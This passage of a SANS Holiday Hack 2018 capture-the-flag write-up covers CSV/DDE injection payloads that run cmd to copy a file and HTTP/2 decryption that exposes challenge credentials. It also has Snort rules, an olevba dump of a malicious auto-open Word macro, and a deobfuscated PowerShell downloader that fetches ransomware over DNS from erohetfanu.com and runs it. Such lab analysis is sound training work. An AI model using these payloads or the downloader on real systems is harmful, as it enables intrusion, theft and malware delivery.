        <button class="btn btn-success">User Access Granted - Control number 19880715</button>
      </div>

      <div class="border p-2 m-2">
        <div class="dropdown">
          <button class="btn btn-dark dropdown-toggle" type="button" id="dropdownMenuButton" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
            <a id="obj7"></a>Objective 7
          </button>
          <div class="dropdown-menu" aria-labelledby="dropdownMenuButton">
            <a class="dropdown-item" href="#hntSparkle">Sparkle Redberry Hints</a>
            <a class="dropdown-item" href="#npcSparkle">Sparkle Redberry</a>
            <a class="dropdown-item" href="#termGitpasshist">Dev Ops Fail</a>
          </div>
        </div>
        <p>Santa uses an Elf Resources website to look for talented information security professionals. <a href="https://careers.kringlecastle.com/">Gain access to the website</a> and fetch the document <code>C:\candidate_evaluation.docx</code>. Which terrorist organization is secretly supported by the job applicant whose name begins with "K"? <i>For hints on achieving this objective, please visit <a href="#npcSparkle">Sparkle Redberry</a> and help her with the <a href="#termGitpasshist"><b>Dev Ops Fail</b></a> Cranberry Pi terminal challenge.</i></p>
        <hr class="my-4">
        <p>The first thing we try on this one is to see what happens when we try to visit a <a href="https://careers.kringlecastle.com/dfkdhflksdhf">non-existant page</a>. We get an expected 404 page but with an unexpected error</p>
        <pre class="text-monospace bg-dark text-light p-2" style="white-space: pre-wrap">Publicly accessible file served from:
C:\careerportal\resources\public\ not found......
Try:
https://careers.kringlecastle.com/public/'file name you are looking for'</pre>
        <p>Well, now we know that if we can drop a file in <kbd>C:\careerportal\resources\public\</kbd> we can access it by filename at <kbd>https://careers.kringlecastle.com/public/</kbd>. It seems like our best bet would be to try to get the file, <kbd>C:\candidate_evaluation.docx</kbd>, into the <kbd>C:\careerportal\resources\public\</kbd> somehow.</p>
        <p><a href="#npcMinty">Minty</a> says that Tangle's employee import system takes CSV files as imports and that it's likely vulnerable. She even says that that <i><a href="https://www.owasp.org/index.php/CSV_Injection">OWASP</a> has guidance on what not to allow with such <b>oploads</b></i> She also mentioned that <a href="https://www.youtube.com/watch?v=Z3qpcKVv2Bg">Brian Hostetler is giving a talk on CSV injection</a>.</p>
        <p>The OWASP page gives us some ideas to try. We'll try two different CSV documents with the following test1 and test2 target names. Since this is a blind injection, and the vulnerability only happens when the user opens the document, we don't know how long it will take to execute, if it executes at all. The test names will help tell use which method works.</p>
        <a href="artefacts/test1.csv"><pre>=DDE("cmd";"/C copy C:\candidate_evaluation.docx C:\careerportal\resources\public\test1.docx";"__DdeLink_60_870516294")</pre></a>
        <a href="artefacts/test2.csv"><pre>=cmd|'/C copy C:\candidate_evaluation.docx C:\careerportal\resources\public\test2.docx'!A0</pre></a>
        <p>https://careers.kringlecastle.com/public/test1.docx did not work, but <a href="artefacts/candidate_evaluation.docx">https://careers.kringlecastle.com/public/test2.docx</a> did! Looking at the downloaded document we can see that one candidate by the name of <b>Krampus</b> may be linked the a cyber terrorist organization:</p>
        <button class="btn btn-success">Fancy Beaver</button>
      </div>

      <div class="border p-2 m-2">
        <div class="dropdown">
          <button class="btn btn-dark dropdown-toggle" type="button" id="dropdownMenuButton" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
            <a id="obj8"></a>Objective 8
          </button>
          <div class="dropdown-menu" aria-labelledby="dropdownMenuButton">
            <a class="dropdown-item" href="#hntSugar">SugarPlum Mary Hints</a>
            <a class="dropdown-item" href="#npcSugar">SugarPlum Mary</a>
            <a class="dropdown-item" href="#termPythonDockerChallenge">Python Escape from LA</a>
          </div>
        </div>
        <p>Santa has introduced a <a href="https://packalyzer.kringlecastle.com/">web-based packet capture and analysis tool</a> to support the elves and their information security work. Using the system, access and decrypt HTTP/2 network activity. What is the name of the song described in the document sent from Holly Evergreen to Alabaster Snowball? <i>For hints on achieving this objective, please visit <a href="#npcSugar">SugarPlum Mary</a> and help her with the <a href="#termPythonDockerChallenge"><b>Python Escape from LA</b></a> Cranberry Pi terminal challenge.</i></p>
        <hr class="my-4">
        <p>Taking a cue from <a href="#npcSugar">SugarPlum Mary</a> let's take a look at the source of https://packalyzer.kringlecastle.com. Both the root and the /register page don't appear to have any useful information other than some links to files at https://packalyzer.kringlecastle.com:80. So, let's go ahead and register and log in.</p>
        <p>Once logged in there is more javascript in the source of the root page. Looking at that source there are mentions of a file called <kbd>app.js</kbd> that performs some functions server side. <a href="https://packalyzer.kringlecastle.com/app.js">https://packalyzer.kringlecastle.com/app.js</a> results in 404, however, most of the javascript files being referenced in the code points to the port 80 url. <a href="https://packalyzer.kringlecastle.com:80/app.js">https://packalyzer.kringlecastle.com:80/app.js</a> results in a <a href="artefacts/app.js">Node.js script</a>.
        <p>In the <b>app.js</b> file there's an interesting function called <kbd>load_envs()</kbd> which loads the variable env_dirs if dev_mode is enable, which according to <kbd>const dev_mode = true;</kbd> it is:</p>
        <pre class="text-monospace bg-dark text-light p-2" style="white-space: pre-wrap">function load_envs() {
  var dirs = []
  var env_keys = Object.keys(process.env)
  for (var i=0; i < env_keys.length; i++) {
    if (typeof process.env[env_keys[i]] === "string" ) {
      dirs.push(( "/"+env_keys[i].toLowerCase()+'/*') )
    }
  }
  return uniqueArray(dirs)
}
if (dev_mode) {
    //Can set env variable to open up directories during dev
    const env_dirs = load_envs();
} else {
    const env_dirs = ['/pub/','/uploads/'];
}</pre>
        <p>This means that any process.env key is added as a directory. That's odd. I wonder if we can leverage that. In the code we can see at least two different process.env variables, <kbd>process.env.DEV</kbd> and <kbd>process.env.SSLKEYLOGFILE</kbd>. <kbd>https://packalyzer.kringlecastle.com/dev</kbd> is unremarkable. let's add a <kbd>/</kbd>. Now we get the message <code>Error: EISDIR: illegal operation on a directory, read</code>. Looks like we're getting somewhere. Let's add more garbage.</p>
        <p><kbd>https://packalyzer.kringlecastle.com/dev/blah</kbd> gives us the message <code>Error: ENOENT: no such file or directory, open '/opt/http2/dev//blah'</code>. Let's try <b>sslkeylogfile</b>. <kbd>https://packalyzer.kringlecastle.com/sslkeylogfile/blah</kbd> gives us the message <code>Error: ENOENT: no such file or directory, open '/opt/http2packalyzer_clientrandom_ssl.log/blah'</code>. From these we can likely deduce that process.DEV = <b>/dev/</b> and process.SSLKEYLOGFILE = <b>packalyzer_clientrandom_ssl.log</b>. <kbd>const key_log_path = ( !dev_mode || __dirname + process.env.DEV + process.env.SSLKEYLOGFILE )</kbd> would then make our key_log_path "/dev/packalyzer_clientrandom_ssl.log". Add that to the rool url and we get <a href="https://packalyzer.kringlecastle.com/dev/packalyzer_clientrandom_ssl.log">https://packalyzer.kringlecastle.com/dev/packalyzer_clientrandom_ssl.log</a>. Lo and behold, we now have CLIENT_RANDOM keys. These must bee the private keys of the network captures.</p>
        <p>Using the standard interface for the application we click on 'Sniff' to capture some traffic. We can then use the 'Captures' button to list our pcap and <a href="artefacts/packalyzer.pcap">download it</a>. While we're at it we need to download the <a href="artefacts/packalyzer.keys">private keys</a> as well.</p>
        <p><a href="https://www.youtube.com/watch?v=9E-8HkDs-kQ">Chris & Chris' talk</a> about HTTP2 is a good guide for the next steps we need to take to decode the HTTP2 traffic in our pcap.</p>
        <ul>
          <li>First we open the <a href="artefacts/packalyzer.pcap">pcap</a> in Wireshark</li>
          <li>Next we select <b>Edit</b> -> <b>Preferences</b></li>
          <li>In the preferences dialog select and expand the <b>Protocol</b> option and find the '<b>SSL</b>'</li>
          <li>Click the 'Browse' button by the input box under <b>(Pre)-Master-Secret log filename</b> and select our <a href="artefacts/packalyzer.keys">keys file</a></li>
          <li>Click <b>Ok</b></li>
        </ul>
        <p>At this point our encrypted stream is now showing the decrypted HTTP2 traffic. Chris' talk gives us some interesting things to look for, one that stands out is around 18 minutes on finding username data that's posted through the stream using first looking for POST traffic using <kbd>http2.header.value == "POST"</kbd>.</p>
        <img src="images/ws-0.png">
        <p>From there we walk through the packets from one of the POSTS. For this exercise we'll select the first hit on post #<b>41</b>. We use the filter <kbd>frame.number >= 41</kbd> and only two frames down in frame 43 we see a DATA stream with json information. This information appears to have the username/password of pepper/Shiz-Bamer_wabl182</p>
        <img src="images/ws-1.png">
        <p>Trying these credentials on the packalyzer gets us in but the account is not an admin. We'll need to check a few more streams to see if we can find someone with real access. Let's try frame 116.</p>
        <img src="images/ws-2.png">
        <p>Jackpot! If anyone has admin privs, it's Alabaster. Using username/password alabaster/Packer-p@re-turntable192 we see that Alabaster has a Saved Pcap called <b>super_secret_packet_capture.pcap</b>. Looking at the traffic it's just basic SMTP traffic on port 25. If we follow the TCP stream we see an email from Holly.evergreen@mail.kringlecastle.com to alabaster.snowball@mail.kringlecastle.com.</p>
        <img src="images/ws-3.png">
        <p>The email has a base64 stream that we can likely extract and reconstruct. If we simply limit the conversation to one direction we're left with just the email which we can save as a file called <a href="artefacts/holly.eml">holly.eml</a>. We can open this email in a mail program or even just strip out just the base64 attachment and reconstruct it. If we go the latter we would do this quickly using the following bash command:</p>
        <pre class="text-monospace bg-dark text-light p-2" style="white-space: pre-wrap">cat holly.eml | tail -n +24 | head -n -7 | base64 -d > music.pdf</pre>
        <ul>
          <li><kbd>tail -n +24</kbd> - skip the first 24 lines which we don't care about.</li>
          <li><kbd>head -n -7</kbd> - drop the last 7 lines which we also don't care about.</li>
          <li><kbd>base64 -d</kbd> - decode the resulting base64 text.</li>
        </ul>
        <p>Now that we have the <a href="artefacts/music.pdf">music.pdf</a> file from Holly to Alabaster, we can now see what song she mentions.</p>
        <button class="btn btn-success">mary had a little lamb</button>

      </div>

      <div class="border p-2 m-2">
        <div class="dropdown">
          <button class="btn btn-dark dropdown-toggle" type="button" id="dropdownMenuButton" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
            <a id="obj91"></a>Objective 9.1
          </button>
          <div class="dropdown-menu" aria-labelledby="dropdownMenuButton">
            <a class="dropdown-item" href="#hntShinny">Shinny Upatree Hints</a>
            <a class="dropdown-item" href="#npcShinny">Shinny Upatree</a>
            <a class="dropdown-item" href="#termUnlinkedFunction">Sleigh Bell Lottery</a>
          </div>
        </div>
        <p>Alabaster Snowball is in dire need of your help. Santa's file server has been hit with malware. Help Alabaster Snowball deal with the malware on Santa's server by completing several tasks. <i>For hints on achieving this objective, please visit <a href="#npcShinny">Shinny Upatree</a> and help him with the <a href="#termUnlinkedFunction"><b>Sleigh Bell Lottery</b></a> Cranberry Pi terminal challenge.</i></p>

        <p>To start, assist Alabaster by accessing (clicking) the snort terminal below:</p>

        <p><a href="https://docker.kringlecon.com/?challenge=snort" target="_blank"><img src="images/snort.png"></a></p>

        <p>Then create a rule that will catch all new infections. What is the success message displayed by the Snort terminal?</p>
        <hr class="my-4">
        <pre class="text-monospace bg-dark text-light p-2" style="white-space: pre-wrap"><span style="color: rgb(239, 41, 41)">  _  __     _             _       _____          _   _
 | |/ /    (_)           | |     / ____|        | | | |
 | ' / _ __ _ _ __   __ _| | ___| |     __ _ ___| |_| | ___
 |  < | '__| | '_ \ / _` | |/ _ \ |    / _` / __| __| |/ _ \
 | . \| |  | | | | | (_| | |  __/ |___| (_| \__ \ |_| |  __/
 |_|\_\_|  |_|_|_|_|\__, |_|\___|\_____\__,_|___/\__|_|\___|
             / ____| __/ |          | |
            | (___  |___/  ___  _ __| |_
             \___ \| '_ \ / _ \| '__| __|
             ____) | | | | (_) | |  | |_
            |_____/|_|_|_|\___/|_|_  \__|
               |_   _|  __ \ / ____|
                 | | | |  | | (___
         _____   | | | |  | |\___ \        __
        / ____| _| |_| |__| |____) |      /_ |
       | (___  |_____|_____/|_____/ _ __   | |
        \___ \ / _ \ '_ \/ __|/ _ \| '__|  | |
        ____) |  __/ | | \__ \ (_) | |     | |
       |_____/ \___|_| |_|___/\___/|_|     |_|
============================================================
INTRO:
  Kringle Castle is currently under attacked by new piece of
  ransomware that is encrypting all the elves files. Your
  job is to configure snort to alert on ONLY the bad
  ransomware traffic.
GOAL:
  Create a snort rule that will alert ONLY on bad ransomware
  traffic by adding it to snorts /etc/snort/rules/local.rules
  file. DNS traffic is constantly updated to snort.log.pcap
COMPLETION:
  Successfully create a snort rule that matches ONLY
  bad DNS traffic and NOT legitimate user traffic and the
  system will notify you of your success.

  Check out ~/more_info.txt for additional information.</span>
elf@776172646f67:~$ cat more_info.txt
MORE INFO:
  A full capture of DNS traffic for the last 30 seconds is
  constantly updated to:

  /home/elf/snort.log.pcap

  You can also test your snort rule by running:

  snort -A fast -r ~/snort.log.pcap -l ~/snort_logs -c /etc/snort/snort.conf

  This will create an alert file at ~/snort_logs/alert

  This sensor also hosts an nginx web server to access the
  last 5 minutes worth of pcaps for offline analysis. These
  can be viewed by logging into:

  http://snortsensor1.kringlecastle.com/

  Using the credentials:
  ----------------------
  Username | elf
  Password | onashelf

  tshark and tcpdump have also been provided on this sensor.

HINT:
  Malware authors often user dynamic domain names and
  IP addresses that change frequently within minutes or even
  seconds to make detecting and block malware more difficult.
  As such, its a good idea to analyze traffic to find patterns
  and match upon these patterns instead of just IP/domains.</pre>
        <p>Let's download some PCAPs to get an idea at what we're looking at. Using the provided website and credentials we a get directory list of a handful of PCAPs. Let's take a look at <a href="artefacts/snort.log.1546255827.0478063.pcap">snort.log.1546255827.0478063.pcap</a></p>
        <img src="images/sn-0.png">
        <p>What immediately jumps out is traffic to <b>77616E6E61636F6F6B69652E6D696E2E707331.aghrsbrenu.org</b> from 10.126.0.240. 10.126.0.73 appears to be communicating with <b>77616E6E61636F6F6B69652E6D696E2E707331.sghreanubr.net</b>. <b>77616E6E61636F6F6B69652E6D696E2E707331</b> looks like hex. If we convert it to ascii we get <b>wannacookie.min.ps1</b>.
        <img src="images/sn-1.png">
        <p>The first packet has a text response of 64. Subequent requests iterate from 0 to 63 (or the initial TXT response -1) in the form of [sequence].77616E6E61636F6F6B69652E6D696E2E707331.[domain]. The next image shows that the that the TXT value of the second to last packet includes hex. We can likely assume that this is the communication method that Shinny was talking about and that these DNS requests are transferring a file called <b>wannacookie.min.ps1</b>.</p>
        <img src="images/sn-2.png">
        <p>Using this info, let's try creating a snort rule that focuses primarily on the hex as that appears to be consistent between systems as well as between requests and responses.</p>
        <pre class="text-monospace bg-dark text-light p-2" style="white-space: pre-wrap">alert udp any any -> any any (msg:"WannaCookie Ransomeware C2"; content:"77616E6E61636F6F6B69652E6D696E2E707331"; sid:100000; rev:1;)</pre>
        <p>Adding the above line to <kbd>/etc/snort/rules/local.rules</kbd> results in the following message</p>
        <pre class="text-monospace bg-dark text-light p-2" style="white-space: pre-wrap"><span style="color: rgb(0, 186, 19);">[+] Congratulation! Snort is alerting on all ransomware and only the ransomware!</span></pre>
        <button class="btn btn-success">Congratulation! Snort is alerting on all ransomware and only the ransomware!</button>
        <p>That answer seems a little too simple though. We can make this a little better.</p>
        <pre class="text-monospace bg-dark text-light p-2" style="white-space: pre-wrap">alert udp any any -> any any (msg: "WannaCookie C2"; pcre: "/([0-9a-f]{2})+/i"; content: "|0a|"; pcre: "/[hansgruber]{10}.[a-z]+/i"; content: "|00|"; sid: 100001; rev:1)</pre>
        <ul>
          <li><kbd>pcre: "/([0-9a-f]{2})+/i";</kbd> - Since the first label of the DNS request is the hex value of the filename, we want to look for hex values. This says to look for one or more <b>pairs</b> hex characters. This is because any ascii character is normally converted into two hex characters.</li>
          <li><kbd>content: "|0a|";</kbd> - DNS requests are expressed in terms of sequences of labels (<a href="https://tools.ietf.org/html/rfc1035">Look at RFC 1035 section 3.1</a>). When we look at a fully qualified domain name we normally use dots to separate each label. This part of the rule says to next look for 0x0a. Wireshark would represent this to us in the interpretation as a dot, but, directly in the payload this means the following label is 10 (0x0a = 10) characters long.</li>
          <li><kbd>pcre: "/[hansgruber]{10}.[a-z]+/i";</kbd> - This next section is always 10 characters long, that's why we have the previous field value of 10. This regular expression rule says to look for the letters in <b>hansgruber</b> in any order followed by <kbd>.</kbd> which means any character, in this case it would cover the length field for the final TLD label. Finally <kbd>[a-z]+</kbd> would cover any TLD one or more characters long. In this excercise we only saw 3, .org, .com, and .net.</li>
          <li><kbd>content: "|00|";</kbd> which is the final closing length label which should always be zero meaning there are no more following lables.</li>
        </ul>
        <p>This rule is a little more concise and should catch downloads of any file using this DNS TXT query method.</p>
      </div>

      <div class="border p-2 m-2">
        <div class="dropdown">
          <button class="btn btn-dark dropdown-toggle" type="button" id="dropdownMenuButton" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
            <a id="obj92"></a>Objective 9.2
          </button>
          <div class="dropdown-menu" aria-labelledby="dropdownMenuButton">
            <a class="dropdown-item" href="#hntAlabaster">Alabaster Snowball Hints</a>
            <a class="dropdown-item" href="#npcAlabaster">Alabaster Snowball</a>
            <a class="dropdown-item" href="#artDocument">Chocolate Chip Cookie Document</a>
          </div>
        </div>
        <p>After completing the prior question, Alabaster gives you a document he suspects downloads the malware. What is the domain name the malware in the document downloads from?</p>
        <hr class="my-4">
        <p>After solving the snort problem and helping Alabster to detect wannacookie traffic, he gives us a <a href="artefacts/CHOCOLATE_CHIP_COOKIE_RECIPE.zip">Zip file with the password of <b>elves</b></a> that he suspects is the source of the malware. We extract the file <code>CHOCOLATE_CHIP_COOKIE_RECIPE.docm</code> from the zip document</p>. Alabster's hint on this is to use <a href="https://github.com/decalage2/oletools/wiki/olevba">olevba</a> to extract macros from the document.</p>
        <pre class="text-monospace bg-dark text-light p-2" style="white-space: pre-wrap"><span style="color: rgb(64, 255, 64); font-weight: bold;">elf@776172646f67</span>$ virtualenv oletools
Running virtualenv with interpreter /usr/bin/python2
New python executable in /mnt/d/git/hh2018/report/artefacts/work/oletools/bin/python2
Also creating executable in /mnt/d/git/hh2018/report/artefacts/work/oletools/bin/python
Installing setuptools, pkg_resources, pip, wheel...done.
wardog@Canterbury:/mnt/d/git/hh2018/report/artefacts/work$ source oletools/bin/activate
<span style="color: rgb(255, 255, 255); font-weight: bold;">(oletools)</span> <span style="color: rgb(64, 255, 64); font-weight: bold;">elf@776172646f67</span>$ pip install oletools
Collecting oletools
Collecting pyparsing (from oletools)
  Downloading https://files.pythonhosted.org/packages/de/0a/001be530836743d8be6c2d85069f46fecf84ac6c18c7f5fb8125ee11d854/pyparsing-2.3.1-py2.py3-none-any.whl (61kB)
    100% |████████████████████████████████| 71kB 310kB/s
Installing collected packages: pyparsing, oletools
Successfully installed oletools-0.53.1 pyparsing-2.3.1
<span style="color: rgb(255, 255, 255); font-weight: bold;">(oletools)</span> <span style="color: rgb(64, 255, 64); font-weight: bold;">elf@776172646f67</span>$ olevba CHOCOLATE_CHIP_COOKIE_RECIPE.docm
olevba 0.53.1 - http://decalage.info/python/oletools
Flags        Filename
-----------  -----------------------------------------------------------------
OpX:MASI---- CHOCOLATE_CHIP_COOKIE_RECIPE.docm
===============================================================================
FILE: CHOCOLATE_CHIP_COOKIE_RECIPE.docm
Type: OpenXML
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls
in file: word/vbaProject.bin - OLE stream: u'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas
in file: word/vbaProject.bin - OLE stream: u'VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Private Sub Document_Open()
Dim cmd As String
cmd = "powershell.exe -NoE -Nop -NonI -ExecutionPolicy Bypass -C ""sal a New-Object; iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('lVHRSsMwFP2VSwksYUtoWkxxY4iyir4oaB+EMUYoqQ1syUjToXT7d2/1Zb4pF5JDzuGce2+a3tXRegcP2S0lmsFA/AKIBt4ddjbChArBJnCCGxiAbOEMiBsfSl23MKzrVocNXdfeHU2Im/k8euuiVJRsZ1Ixdr5UEw9LwGOKRucFBBP74PABMWmQSopCSVViSZWre6w7da2uslKt8C6zskiLPJcJyttRjgC9zehNiQXrIBXispnKP7qYZ5S+mM7vjoavXPek9wb4qwmoARN8a2KjXS9qvwf+TSakEb+JBHj1eTBQvVVMdDFY997NQKaMSzZurIXpEv4bYsWfcnA51nxQQvGDxrlP8NxH/kMy9gXREohG'),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()"" "
Shell cmd
End Sub

-------------------------------------------------------------------------------
VBA MACRO NewMacros.bas
in file: word/vbaProject.bin - OLE stream: u'VBA/NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Sub AutoOpen()
Dim cmd As String
cmd = "powershell.exe -NoE -Nop -NonI -ExecutionPolicy Bypass -C ""sal a New-Object; iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('lVHRSsMwFP2VSwksYUtoWkxxY4iyir4oaB+EMUYoqQ1syUjToXT7d2/1Zb4pF5JDzuGce2+a3tXRegcP2S0lmsFA/AKIBt4ddjbChArBJnCCGxiAbOEMiBsfSl23MKzrVocNXdfeHU2Im/k8euuiVJRsZ1Ixdr5UEw9LwGOKRucFBBP74PABMWmQSopCSVViSZWre6w7da2uslKt8C6zskiLPJcJyttRjgC9zehNiQXrIBXispnKP7qYZ5S+mM7vjoavXPek9wb4qwmoARN8a2KjXS9qvwf+TSakEb+JBHj1eTBQvVVMdDFY997NQKaMSzZurIXpEv4bYsWfcnA51nxQQvGDxrlP8NxH/kMy9gXREohG'),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()"" "
Shell cmd
End Sub

+------------+-----------------+-----------------------------------------+
| Type       | Keyword         | Description                             |
+------------+-----------------+-----------------------------------------+
| AutoExec   | AutoOpen        | Runs when the Word document is opened   |
| AutoExec   | Document_Open   | Runs when the Word or Publisher         |
|            |                 | document is opened                      |
| Suspicious | Shell           | May run an executable file or a system  |
|            |                 | command                                 |
| Suspicious | powershell      | May run PowerShell commands             |
| Suspicious | ExecutionPolicy | May run PowerShell commands             |
| Suspicious | New-Object      | May create an OLE object using          |
|            |                 | PowerShell                              |
| IOC        | powershell.exe  | Executable file name                    |
+------------+-----------------+-----------------------------------------+

<span style="color: rgb(255, 255, 255); font-weight: bold;">(oletools)</span> <span style="color: rgb(64, 255, 64); font-weight: bold;">elf@776172646f67</span>$</pre>
        <p>From this we can see two questionable macros. Let's spin up powershell and play with these to see what they do.</p>
        <img src="images/ps-0.png">
        <p>We're performing two simple tasks, removing <kbd>iex</kbd> which is a shortcut for <kbd>Invoke-Expression</kbd> and instead using <kbd>Write-Output</kbd> to write the result to the terminal.</p>
        <pre class="text-monospace bg-dark text-light p-2" style="white-space: pre-wrap">function H2A($a) {
  $o;
  $a -split '(..)' | ? { $_ }  | forEach {[char]([convert]::toint16($_,16))} | forEach {$o = $o + $_};
  return $o
};
$f = "77616E6E61636F6F6B69652E6D696E2E707331";
$h = "";
foreach ($i in 0..([convert]::ToInt32((Resolve-DnsName -Server erohetfanu.com -Name "$f.erohetfanu.com" -Type TXT).strings, 10)-1)) {
  $h += (Resolve-DnsName -Server erohetfanu.com -Name "$i.$f.erohetfanu.com" -Type TXT).strings
};
iex($(H2A $h | Out-string))</pre>
        <p>Well, there's the domain for our challenge.</p>
        <button class="btn btn-success">erohetfanu.com</button>
        <p>But, let's look at this a little closer</p>
        <p>The <b>H2A</b> funtion appears to simply take in an expected hex value and convert it to ascii.</p>
        <p>The <b>77616E6E61636F6F6B69652E6D696E2E707331</b> we've already established is hex that converts to <b>77616E6E61636F6F6B69652E6D696E2E707331</b>.</p>
        <p><b>$h is a variable to include the results from the next foreach loop</b></p>
        <p>The final foreach loop looks like it first asks the server <b>erohetfanu.com</b> for the TXT record of <b>77616E6E61636F6F6B69652E6D696E2E707331.erohetfanu.com</b> and converts the answer to a decimal, then iterates from 0 to that value minus 1.</p>
        <p>In the foreach loop a TXT request is sent to erohetfanu.com for <b>$i.77616E6E61636F6F6B69652E6D696E2E707331.erohetfanu.com</b> where <b>$i</b> is the current iterator value and adds that result to the <b>$h</b> variable</p>
        <p>Finally, $h is pushed into our H2A function which supposedly converts hex to ascii. The result is output as a string and then invoked with the <kbd>iex</kbd> cmdlet. This does appear to be how systems are being infected with wannacookie.</p>
        <p>We can get the <a href="artefacts/wannacookie.min.ps1">wannacookie.min.ps1</a> by chaninge the last line to just <kbd>H2A $h| Out-File wannacookie.min.ps1</kbd>.</p>
        <p>As a matter of fact... We could probably download any file that we want that exists in the server's directory. One thing we could try is to remove the <b>.min</b> portion. We would need to convert our hex to reflect <b>wannacookie.ps1</b>. That would be <b>77616e6e61636f6f6b69652e707331</b>. Hey! Wow that worked! It looks like we have a non-minimized version of <a href="artefacts/wannacookie.ps1">wannacookie</a>. <a href="#artWannacookie">We break down this source code in the Artefacts section</a>.</p>
      </div>

      <div class="border p-2 m-2">
        <div class="dropdown">
          <button class="btn btn-dark dropdown-toggle" type="button" id="dropdownMenuButton" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
            <a id="obj93"></a>Objective 9.3
          </button>
          <div class="dropdown-menu" aria-labelledby="dropdownMenuButton">
            <a class="dropdown-item" href="#npcAlabaster">Alabaster Snowball</a>
            <a class="dropdown-item" href="#artMalware">Malware Sourcecode</a>
            <a class="dropdown-item" href="https://hohohodaddy.kringlecastle.com/index.html">HoHoHo Daddy</a>
          </div>
        </div>
        <p>Analyze the full malware source code to find a kill-switch and activate it at the North Pole's domain registrar <a href="https://hohohodaddy.kringlecastle.com/index.html">HoHoHo Daddy</a>.</p>
        <p>What is the full sentence text that appears on the domain registration success message (bottom sentence)?</p>
        <hr class="my-4">
        <p>Based on our analysis <a href="#artWannacookie">of the Wannacookie malware the artefacts section</a> we can see that there is a portion that will tell the malware to quit if certain conditions are met</p>
        <pre class="text-monospace bg-dark text-light p-2" style="white-space: pre-wrap">$S1 = "1f8b080000000000040093e76762129765e2e1e6640f6361e7e202000cdd5c5c10000000";
if ($null -ne ((Resolve-DnsName -Name $(H2A $(B2H $(ti_rox $(B2H $(G2B $(H2B $S1))) $(Resolve-DnsName -Server erohetfanu.com -Name 6B696C6C737769746368.erohetfanu.com -Type TXT).Strings))).ToString() -ErrorAction 0 -Server 8.8.8.8))) { return };</pre>
        <p>Here, if this specific DNS request is <b>NOT</b> null, then <b>return</b> which basically just means to quit the function. Breaking it down, <b>6B696C6C737769746368</b> converts to <b>killswitch</b>. <kbd>Resolve-DnsName -Server erohetfanu.com -Name 6B696C6C737769746368.erohetfanu.com -Type TXT</kbd> returns a hex string of <b>66667272727869657268667865666B73</b> which translates to <b>ffrrrxierhfxefks</b>.</p>
        <p>Meanwhile, the value <b>$S1 = "1f8b080000000000040093e76762129765e2e1e6640f6361e7e202000cdd5c5c10000000"</b>. That value is fed through a few different functions (hover over the function names). <kbd data-toggle="tooltip" title="Hex to Byte Array">H2B</kbd> -&gt; <kbd data-toggle="tooltip" title="GZIP compressed stream to Byte Array">G2B</kbd> -&gt; <kbd data-toggle="tooltip" title="Byte Array to Hex">B2H</kbd> resulting in the value <b>1f0f0202171d020c0b09075604070a0a</b>. These two values are pushed to <kbd data-toggle="tooltip" title="reversed it's xor_it, likely and XOR function">ti_rox</kbd> -&gt; <kbd data-toggle="tooltip" title="Byte Array to Hex">B2H</kbd> -&gt; <kbd data-toggle="tooltip" title="Hex to ASCII">H2A</kbd>. After feeding those functions into powershell and executing our code we get the domain that appears to be our killswitch, <b>yippeekiyaa.aaay</b>.</p>
        <button class="btn btn-success">Successfully registered yippeekiyaa.aaay!</button>
      </div>

      <div class="border p-2 m-2">
        <div class="dropdown">
          <button class="btn btn-dark dropdown-toggle" type="button" id="dropdownMenuButton" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
            <a id="obj94"></a>Objective 9.4
          </button>
          <div class="dropdown-menu" aria-labelledby="dropdownMenuButton">
            <a class="dropdown-item" href="#npcAlabaster">Alabaster Snowball</a>
          </div>
        </div>
        <p>After activating the kill-switch domain in the last question, Alabaster gives you <a href="https://www.holidayhackchallenge.com/2018/challenges/forensic_artifacts.zip">a zip file</a> with a memory dump and encrypted password database. Use these files to decrypt Alabaster's password database. What is the password entered in the database for the <b>Vault</b> entry?</p>
        <hr class="my-4">
        <p>When we open the zip file we are presented with two files:</p>
        <ul>
          <li><b>alabaster_passwords.elfdb.wannacookie</b> - A wannacookie encrypted elfdb file.</li>
          <li><b>powershell.exe_181109_104716.dmp</b> - A powershell dump file.</li>
        </ul>
        <p><a href="https://www.youtube.com/watch?v=wd12XRq2DNk">Chris Davis gives us some good pointers</a> on using <a href="https://github.com/chrisjd20/power_dump">PowerDump</a> to parse the <b>powershell.exe_181109_104716.dmp</b> file.</p>
        <pre class="text-monospace bg-dark text-light p-2" style="white-space: pre-wrap"><span style="color: rgb(73, 113, 126);">==============================</span>
<span style="color: rgb(73, 113, 126);"> |  __ \</span>
<span style="color: rgb(73, 113, 126);"> | |__) |____      _____ _ __</span>
<span style="color: rgb(73, 113, 126);"> |  ___/ _ \ \ /\ / / _ \ '__|</span>
<span style="color: rgb(73, 113, 126);"> | |  | (_) \ V  V /  __/ |</span>
<span style="color: rgb(73, 113, 126);"> |_|   \___/ \_/\_/ \___|_|</span>
<span style="color: rgb(181, 137, 0);"> __</span>                       <span style="color: rgb(181, 137, 0);">__</span>
<span style="color: rgb(181, 137, 0);"> \ \</span>         <span style="color: rgb(68, 182, 54);">(   )</span>       <span style="color: rgb(181, 137, 0);">/ /</span>
<span style="color: rgb(181, 137, 0);">  \ \_</span>    <span style="color: rgb(68, 182, 54);">(   ) (</span>      <span style="color: rgb(181, 137, 0);">_/ /</span>
<span style="color: rgb(181, 137, 0);">   \__\</span>    <span style="color: rgb(68, 182, 54);">)</span> <span style="color: rgb(211, 54, 130);">_</span>   <span style="color: rgb(68, 182, 54);">)</span>    <span style="color: rgb(181, 137, 0);">/__/</span>
